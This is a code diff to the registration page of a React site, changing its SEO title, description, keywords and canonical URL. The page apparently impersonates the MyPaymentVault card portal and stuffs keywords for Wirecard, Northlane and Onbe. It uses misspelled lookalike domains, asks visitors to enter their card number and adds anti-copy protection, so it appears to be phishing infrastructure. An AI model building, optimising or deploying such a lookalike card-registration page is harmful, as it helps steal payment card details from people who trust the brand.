@@ -86,10 +86,10 @@ export default function RegisterPage() {
   return (
     <>
       <SEO 
-        title="Register Card | Login MyPaymentVault | Login Wirecard | Login Northlane | North Lane"
-        description="Register payment cards - Login MyPaymentVault, Login Wirecard, Login North Lane, Login Northlane. Secure alternative to Wirecard 2 & Onbe 1. Fast card registration portal."
-        keywords="login mypaymentvault, login wirecard, login north lane, login northlane, login wirecard 2, login onbe 1, register mypaymentvault, register wirecard, register northlane, register north lane, wirecard 2 register, onbe 1 register, card registration, mypaymentvault signup, wirecard signup, northlane signup, north lane card registration, payment gateway signup"
-        canonical="https://login-mypaymentvaultt.com/register"
+        title="Create Your Account | MyPaymentVault Registration"
+        description="Create your MyPaymentVault account. Input the Card Number that displays on the front of your card to register and access your payment details securely."
+        keywords="MyPaymentVault create account, mypaymentvault registration, register mypaymentvault, create payment vault account, new account mypaymentvault, employee registration, payment card registration, onbe registration, wirecard registration"
+        canonical="https://login-mypaymentvaultl.com/register"
       />
       <AntiCopyProtection />
       <div>
